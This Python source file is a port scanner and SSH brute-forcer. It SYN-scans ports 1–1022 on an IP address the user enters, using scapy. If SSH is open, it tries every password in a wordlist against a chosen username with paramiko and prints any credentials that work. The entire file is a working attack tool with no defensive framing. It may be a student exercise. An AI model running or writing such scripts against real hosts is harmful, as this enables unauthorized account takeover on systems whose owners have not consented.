import sys
from requests import Timeout
import scapy.all
from ipaddress import ip_address
from logging import getLogger, ERROR
from scapy.config import conf
from scapy.layers.inet import TCP, IP, ICMP
from scapy.sendrecv import sr1, sr
from scapy.volatile import RandShort
import paramiko, sys, os, socket, termcolor

conf.use_pcap = True
ports_to_scan = range(1, 1023)
open_ports = []
target = input("Enter IP Address to Scan: ")


#getting the target ip from the user to scan for  ports. Validate IP
def main():
    if input_sanity():
        if chk_target_avail():
            #print(chk_target_avail())
            for i in ports_to_scan:
                status = is_port_open(i)
                if status:
                    #print("the port", i, "open")
                    open_ports.append(i)
    if 22 in open_ports:
        print("SSH port is open") 
        choice_user = input("Enter y or n if you want to bruteforce SSH : ")
        if choice_user == 'y' or choice_user == 'Y' :
            brute_force(22)
        else:
            print("bye")
            sys.exit(1)

def input_sanity():
    global target
    while True:
        try:
            ip_address(target)
            #print("valid IP")
            return True
            break
        except ValueError:
            print("Pls re-enter valid ip")
            target=input("Enter IP Address again : ")
            continue

def chk_target_avail():
    global target
    try:
        conf.verb=0
        reply = sr1(IP(dst=target)/ICMP(),timeout = 3)
        if reply:
            print("Host is up and ports will be scanned now")
            return True
        #except Exception
    except Exception as err:
        print("host is unreachable")
        print(f"Unexpected {err=}, {type(err)=}")
        return False


#and check if host is alive
#chk_target_avail()
#target = "192.168.56.104"



 # The Availability Check Function


# CALLING TO CHK AVAIL


#function to take *single* port as input and chk if open
def is_port_open(curr_port):
    #print("port is being scanned,", target,curr_port)
    source_port = RandShort()
    conf.verb = 0
    resp = sr1(IP(dst=target) / TCP(sport=source_port,dport = curr_port,flags="S"),timeout=1)
    #print(type(resp),"for", target, "in", curr_port, "from", source_port) 

    if resp is None:
        #print("Filtered")
        return False
    elif(resp.haslayer(TCP)):
        if(resp.getlayer(TCP).flags == 0x12):
            send_rst = sr(IP(dst=target)/TCP(sport=source_port,dport=curr_port,flags="R"),timeout=10)
            return True
            #print ("Open", "adding port t list")
            #open_ports.append(curr_port)
        elif (resp.getlayer(TCP).flags == 0x14):
            #print ("Closed")
            return False
        elif(resp.haslayer(ICMP)):
            if(int(resp.getlayer(ICMP).type)==3 and int(resp.getlayer(ICMP).code) in [1,2,3,9,10,13]):
                #print ("Filtered")
                return False



def brute_force(port_no):
    username = input('[+] SSH Username: ')
    def ssh_connect(password, code=0):
        SSHconn = paramiko.SSHClient()
        SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            SSHconn.connect(target, port=22, username=username, password=password, timeout=1)
        except paramiko.AuthenticationException:
            code = 1
        except socket.error as e:
            code = 2

        SSHconn.close()
        return code

    with open('PasswordList.txt', 'r') as file:
        for line in file.readlines():
            password = line.strip()
            try:
                response = ssh_connect(password)
                if response == 0:
                    print(termcolor.colored(('[+] Found Password: ' + password + ' , For Account: ' + username), 'red'))
                    break
                elif response == 1:
                    print(termcolor.colored(('[+] Incorrect Login: ' + password + ' , For Account: ' + username), 'green'))
#               print('[-] Incorrect Login: ' + password)
                elif response == 2:
                    print('[!!] Cant Connect')
                    sys.exit(1)
            except Exception as e:
                    print(e)
                    pass


main()

